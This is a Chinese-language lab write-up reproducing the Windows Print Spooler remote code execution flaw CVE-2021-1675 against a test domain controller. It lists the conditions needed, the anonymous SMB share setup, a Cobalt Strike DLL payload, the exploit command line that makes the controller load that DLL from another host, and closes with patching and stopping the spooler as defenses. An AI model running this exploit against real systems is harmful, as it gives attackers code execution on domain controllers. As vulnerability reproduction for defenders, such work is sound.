# CVE-2021-1675 Windows Spooler Service RCE复现

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUzNTEyMTE0Mw==&mid=2247484925&idx=1&sn=8fd4c4f15fea0c1f60a50c788e2a4192&chksm=fa8b1865cdfc9173d89b97b7f1423726aed7ddc40cdf6b020bc4b2c7044ee8b7a9fe62fce225&scene=126&sessionid=1681663385#rd](http://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484925&idx=1&sn=8fd4c4f15fea0c1f60a50c788e2a4192&chksm=fa8b1865cdfc9173d89b97b7f1423726aed7ddc40cdf6b020bc4b2c7044ee8b7a9fe62fce225&scene=126&sessionid=1681663385#rd)

复现漏洞利用的Windows版本是Windows Server 2019 Version 1809，使用了 https://github.com/cube0x0/CVE-2021-1675 项目的python版本exp。

## 测试流程

经过反复测试后，发现远程命令执行需要满足一些条件：

1.  创建的smb服务允许匿名访问。
2.  验证使用普通域用户的用户名和密码。
3.  需要在域环境内。

首先在域控上添加一个普通域用户，设置用户名和密码

![](../Images/a14577c80b160dc76c704013c4d4de5b.png)

  

因为spoolsv.exe是x64的，所以我们这里Cobalt Strike也生成x64的dll

![](../Images/964bfac69769dffdf0456e7198567447.png)

  

按照 https://github.com/cube0x0/CVE-2021-1675 的smb设置方法，在域内一台主机上提供匿名访问权限的共享文件

![](../Images/c02042d328774f0b4cdbc28c8cef1c30.png)

  

在域内的其他主机上放置好生成的artifact.dll，设置分享目录并允许匿名访问，在域控上必须能直接获取到文件

![](../Images/604eaa0958bd675666c1160340725761.png)

  

使用exp，参数分别是刚才创建的新域用户的用户名和密码，还有DC的ip，最后是smb共享文件的路径

```

python CVE-2021-1675.py testUser:123qweASD@192.168.92.150 \\192.168.92.130\share\artifact.dll
```

这里会遇到一些坑，如果报错 **Error: code: 0x5 - rpc\_s\_access\_denied** 说明smb还不能匿名访问，如果连续执行成功，但是只复制了dll并未执行，可能是验证用户不是普通域用户账号。

使用Procmon发现测试用的 artifact.dll 已经被spoolsv.exe加载：

![](../Images/5911f068b19773c2aae85bff3e30d81d.png)

  

上线成功

![](../Images/185d514a276e9528b0cc6cf195f3cfa0.png)

  

## 防御方法

安装微软 **CVE-2021-1675** 漏洞补丁

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675

关闭打印机服务

```

Stop-Service Spooler
```
